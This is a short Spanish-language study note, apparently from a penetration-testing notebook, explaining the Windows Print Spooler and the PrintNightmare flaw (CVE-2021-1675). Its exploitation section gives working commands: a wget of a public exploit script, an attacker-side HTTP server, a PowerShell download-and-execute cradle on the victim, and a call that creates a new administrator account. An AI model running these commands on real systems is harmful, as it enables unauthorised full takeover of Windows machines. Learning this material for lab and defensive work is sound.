-----
- Tags: #escalada #teoria #practica
----
# Print Spooler

### El **Print Spooler** (También conocido como "Spooler de impresión") en Windows es un servicio  del sistema operativo que administra la impresión de documentos en una impresora conectada a la computadora. Su función principal es manejar la cola de impresión, que es una lista de trabajos de impresión pendientes que esperan ser procesados y enviados a la impresora.

-----
# PrintNightmare (CVE-2021-1675)

### Un atacante remoto autenticado puede abusar del servicio de cola de impresión para cargar una DLL a través de una solicitud DCERPC diseñada, lo que resulta en la ejecución remota de código como **NT AUTHORITY\\SYSTEM**. Este módulo utiliza el vector MS-RPRN que requiere que se esté ejecutando el servicio Print Spooler.

----
# Explotación 

### Para explotar esto, podemos hacer uso de un [script en powershell](https://github.com/calebstewart/CVE-2021-1675) que automatiza toda la explotación de esta vulnerabilidad asociada al **CVE-2021-1675**. 

#### Máquina atacante
```bash
wget https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1

python3 -m http.server 80
```
#### Máquina víctima
```powershell
IEX(New-Object Net.WebClient).downloadString('http://{our_ip}/CVE-2021-1675.ps1')

Invoke-Nightmare -DriverName "dobliuw" -NewUser "dobliuw" -NewPassword "dobliuw123$!"
```
### Una vez realizado este proceso, se creara un nuevo usuario llamado dobliuw con la contraseña dobliuw123$! perteneciente al grupo **Administrators** de manera que habríamos escalado privilegios obteniendo el máximo acceso al sistema.


